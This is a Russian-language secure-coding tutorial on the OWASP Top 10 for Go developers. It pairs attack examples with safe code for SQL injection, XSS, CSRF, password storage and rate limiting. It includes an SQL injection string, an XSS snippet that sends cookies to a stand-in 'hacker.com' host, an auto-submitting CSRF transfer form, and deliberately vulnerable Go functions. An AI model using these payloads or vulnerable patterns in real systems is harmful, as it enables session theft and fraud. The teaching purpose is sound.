## 🚩 OWASP Top 10

**OWASP** — это открытый проект обеспечения безопасности веб-приложений. Каждые несколько лет они выпускают список из 10 самых критичных уязвимостей. Это "библия" безопасности для разработчика.


### Top 10 (2021):

1. **Broken Access Control** — неправильная проверка прав доступа
2. **Cryptographic Failures** — слабое шифрование
3. **Injection** — SQL, NoSQL, LDAP инъекции
4. **Insecure Design** — ошибки в архитектуре
5. **Security Misconfiguration** — небезопасные настройки
6. **Vulnerable Components** — уязвимые зависимости
7. **Authentication Failures** — слабая аутентификация
8. **Software and Data Integrity Failures** — непроверенные обновления
9. **Logging Failures** — недостаточное логирование
10. **Server-Side Request Forgery (SSRF)** — принудительные запросы от сервера

## 💉 SQL Инъекции

Злоумышленник вставляет вредоносный SQL-код в поле ввода.


### Пример атаки:

```sql
-- Обычный запрос
SELECT * FROM users WHERE username = 'admin' AND password = '12345'

-- Атака: в поле login пишем: admin' OR '1'='1
SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = '12345'
-- Всегда true! Вход без пароля
```


### ❌ Опасный код (склеивание строк):

```go
func getUserByName(name string) (*User, error) {
    // ОПАСНО! Уязвимо к SQL injection
    query := "SELECT * FROM users WHERE name = '" + name + "'"
    row := db.QueryRow(query)
    // ...
}
```


### ✅ Безопасный код (Prepared Statements):

```go
func getUserByName(name string) (*User, error) {
    // Безопасно: используем плейсхолдеры
    query := "SELECT id, name, email FROM users WHERE name = ?"
    row := db.QueryRow(query, name)
    
    var user User
    err := row.Scan(&user.ID, &user.Name, &user.Email)
    if err != nil {
        return nil, err
    }
    
    return &user, nil
}
```


### С использованием ORM (GORM):

```go
import "gorm.io/gorm"

func getUserByName(db *gorm.DB, name string) (*User, error) {
    var user User
    // GORM автоматически защищает от SQL injection
    result := db.Where("name = ?", name).First(&user)
    if result.Error != nil {
        return nil, result.Error
    }
    return &user, nil
}
```

> [!CAUTION]
> Никогда не склеивайте SQL-запросы вручную! Всегда используйте **Prepared Statements** или **ORM**.

## 📜 XSS (Cross-Site Scripting)

Внедрение вредоносного JavaScript-кода на страницу, которую увидят другие пользователи.


### Пример атаки:

XSS-атака происходит, когда злоумышленник вставляет вредоносный JavaScript-код на веб-страницу, которую затем видят другие пользователи. Например:

Пользователь оставляет комментарий:
```html
<script>
    fetch('https://hacker.com?cookie=' + document.cookie)
</script>
```

Если вы выводите это на страницу без экранирования — все куки утекают!

Другой пример: пользователь вводит в поле поиска:
```html
<img src=x onerror=alert('XSS')>
```

Если этот код будет отображен на странице как есть, браузер выполнит JavaScript и покажет alert, что доказывает наличие уязвимости.


### ❌ Опасный код:

```go
func showComment(w http.ResponseWriter, comment string) {
    // ОПАСНО! Выводим как есть
    fmt.Fprintf(w, "<div>%s</div>", comment)
}
```


### ✅ Безопасный код (HTML экранирование):

```go
import "html/template"

func showComments(w http.ResponseWriter, comments []string) {
    tmpl := template.Must(template.New("comments").Parse(`
        {{range .}}
        <div>{{.}}</div>
        {{end}}
    `))
    
    // template автоматически экранирует HTML
    tmpl.Execute(w, comments)
}
```


### Ручное экранирование:

```go
import "html"

func showComment(w http.ResponseWriter, comment string) {
    // Безопасно: экранируем специальные символы
    escaped := html.EscapeString(comment)
    fmt.Fprintf(w, "<div>%s</div>", escaped)
}

// Ввод: <script>alert('XSS')</script>
// Вывод: &lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;
```


### Content Security Policy (CSP):

Content Security Policy (CSP) — это важный механизм безопасности, который помогает предотвратить межсайтовый скриптинг (XSS), кликджекинг и другие атаки, связанные с внедрением кода. CSP позволяет веб-сайтам контролировать, какие ресурсы могут загружаться и исполняться в браузере, указывая разрешенные источники для скриптов, стилей, изображений и других ресурсов.

```go
func addSecurityHeaders(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        // CSP: запрещает выполнение inline scripts
        w.Header().Set("Content-Security-Policy", "default-src 'self'; script-src 'self'")
        next.ServeHTTP(w, r)
    })
}
```

## 🕵️‍♂️ CSRF (Cross-Site Request Forgery)

Злоумышленник заставляет ваш браузер отправить запрос на другой сайт, где вы авторизованы (например, на сайт банка для перевода денег).


### Как работает атака:

1. Вы залогинены на `bank.com`
2. Заходите на вредоносный сайт `evil.com`
3. На `evil.com` есть скрытая форма:
   ```html
   <form action="https://bank.com/transfer" method="POST">
       <input name="to" value="hacker">
       <input name="amount" value="10000">
   </form>
   <script>document.forms[0].submit()</script>
   ```
4. Форма автоматически отправляется с вашими куками!


### ✅ Защита: CSRF tokens

```go
import (
    "crypto/rand"
    "encoding/base64"
    "net/http"
)

// Генерация CSRF токена
func generateCSRFToken() (string, error) {
    b := make([]byte, 32)
    _, err := rand.Read(b)
    if err != nil {
        return "", err
    }
    return base64.StdEncoding.EncodeToString(b), nil
}

// Middleware для проверки CSRF
func csrfMiddleware(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        if r.Method == "POST" || r.Method == "PUT" || r.Method == "DELETE" {
            // Проверяем токен
            formToken := r.FormValue("csrf_token")
            sessionToken, _ := getSessionCSRFToken(r) // из сессии
            
            if formToken == "" || formToken != sessionToken {
                http.Error(w, "CSRF token mismatch", http.StatusForbidden)
                return
            }
        }
        next.ServeHTTP(w, r)
    })
}

// В форме добавляем скрытое поле
func renderForm(w http.ResponseWriter, csrfToken string) {
    fmt.Fprintf(w, `
        <form method="POST" action="/transfer">
            <input type="hidden" name="csrf_token" value="%s">
            <input name="amount">
            <button>Отправить</button>
        </form>
    `, csrfToken)
}
```


### SameSite Cookie (дополнительная защита):

```go
http.SetCookie(w, &http.Cookie{
    Name:     "session",
    Value:    sessionID,
    SameSite: http.SameSiteStrictMode, // Кука не отправляется с других сайтов
    HttpOnly: true,
    Secure:   true,
})
```

## 🔐 Безопасное хранение паролей


### ❌ НИКОГДА не делайте так:

```go
// Хранение в открытом виде — КАТАСТРОФА!
password := "12345"
db.Exec("INSERT INTO users (password) VALUES (?)", password)

// MD5/SHA1 — тоже плохо (слишком быстрые, легко брутфорсить)
hashedPassword := md5.Sum([]byte(password))
```


### ✅ Правильно: bcrypt

```go
import "golang.org/x/crypto/bcrypt"

// Хеширование пароля при регистрации
func hashPassword(password string) (string, error) {
    // Cost = 12 (чем больше, тем медленнее, но безопаснее)
    bytes, err := bcrypt.GenerateFromPassword([]byte(password), 12)
    return string(bytes), err
}

// Проверка пароля при логине
func checkPassword(password, hash string) bool {
    err := bcrypt.CompareHashAndPassword([]byte(hash), []byte(password))
    return err == nil
}

func register(username, password string) error {
    hashedPassword, err := hashPassword(password)
    if err != nil {
        return err
    }
    
    _, err = db.Exec("INSERT INTO users (username, password) VALUES (?, ?)",
                     username, hashedPassword)
    return err
}

func login(username, password string) (*User, error) {
    var user User
    err := db.QueryRow("SELECT id, username, password FROM users WHERE username = ?",
                       username).Scan(&user.ID, &user.Username, &user.PasswordHash)
    if err != nil {
        return nil, err
    }
    
    if !checkPassword(password, user.PasswordHash) {
        return nil, errors.New("invalid password")
    }
    
    return &user, nil
}
```

> [!NOTE]
> **Argon2** еще безопаснее, чем bcrypt, и рекомендуется для новых приложений.

## 🛠️ Общие советы (Best Practices)


### 1. Принцип наименьших привилегий

```go
// ❌ ПЛОХО: приложение имеет admin права к БД
db, _ := sql.Open("mysql", "root:password@tcp(localhost:3306)/mydb")

// ✅ ХОРОШО: создайте отдельного юзера с ограниченными правами
db, _ := sql.Open("mysql", "app_user:password@tcp(localhost:3306)/mydb")
```


### 2. Валидация и санитизация ввода

```go
import (
    "net/mail"
    "regexp"
)

func validateEmail(email string) bool {
    _, err := mail.ParseAddress(email)
    return err == nil
}

func validateUsername(username string) bool {
    // Только буквы и цифры, 3-20 символов
    matched, _ := regexp.MatchString(`^[a-zA-Z0-9]{3,20}$`, username)
    return matched
}

func sanitizeFilename(filename string) string {
    // Удаляем опасные символы
    re := regexp.MustCompile(`[^a-zA-Z0-9._-]`)
    return re.ReplaceAllString(filename, "")
}
```


### 3. Rate Limiting (защита от брутфорса)

```go
import (
    "sync"
    "time"
)

type RateLimiter struct {
    requests map[string][]time.Time
    mu       sync.Mutex
    limit    int
    window   time.Duration
}

func NewRateLimiter(limit int, window time.Duration) *RateLimiter {
    return &RateLimiter{
        requests: make(map[string][]time.Time),
        limit:    limit,
        window:   window,
    }
}

func (rl *RateLimiter) Allow(ip string) bool {
    rl.mu.Lock()
    defer rl.mu.Unlock()
    
    now := time.Now()
    // Получаем запросы за последнее окно
    validRequests := []time.Time{}
    for _, reqTime := range rl.requests[ip] {
        if now.Sub(reqTime) < rl.window {
            validRequests = append(validRequests, reqTime)
        }
    }
    
    if len(validRequests) >= rl.limit {
        return false // Превышен лимит
    }
    
    validRequests = append(validRequests, now)
    rl.requests[ip] = validRequests
    return true
}

// Использование
limiter := NewRateLimiter(5, time.Minute) // 5 запросов в минуту

func loginHandler(w http.ResponseWriter, r *http.Request) {
    ip := r.RemoteAddr
    if !limiter.Allow(ip) {
        http.Error(w, "Too many requests", http.StatusTooManyRequests)
        return
    }
    
    // Обработка логина...
}
```

### 5. Безопасные заголовки

```go
func securityHeadersMiddleware(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        // Запрет встраивания в iframe (защита от clickjacking)
        w.Header().Set("X-Frame-Options", "DENY")
        
        // Запрет определения MIME-типа браузером
        w.Header().Set("X-Content-Type-Options", "nosniff")
        
        // XSS защита
        w.Header().Set("X-XSS-Protection", "1; mode=block")
        
        // Content Security Policy
        w.Header().Set("Content-Security-Policy", "default-src 'self'")
        
        // HTTPS only
        w.Header().Set("Strict-Transport-Security", "max-age=31536000; includeSubDomains")
        
        next.ServeHTTP(w, r)
    })
}
```

## 💡 Итог: Чек-лист безопасности

| Угроза | Защита | Go пример |
|:---|:---|:---|
| **SQL Injection** | Prepared Statements | `db.QueryRow("... WHERE id = ?", id)` |
| **XSS** | HTML экранирование | `html/template` |
| **CSRF** | Токены + SameSite | `http.SameSiteStrictMode` |
| **Слабые пароли** | bcrypt/Argon2 | `bcrypt.GenerateFromPassword()` |
| **Брутфорс** | Rate Limiting | Ограничение запросов по IP |
| **Утечка данных** | HTTPS + HttpOnly куки | `Secure: true, HttpOnly: true` |

> [!IMPORTANT]
> Безопасность — это не процесс, который можно сделать один раз. Это непрерывная работа над кодом и инфраструктурой. 🛡️✨
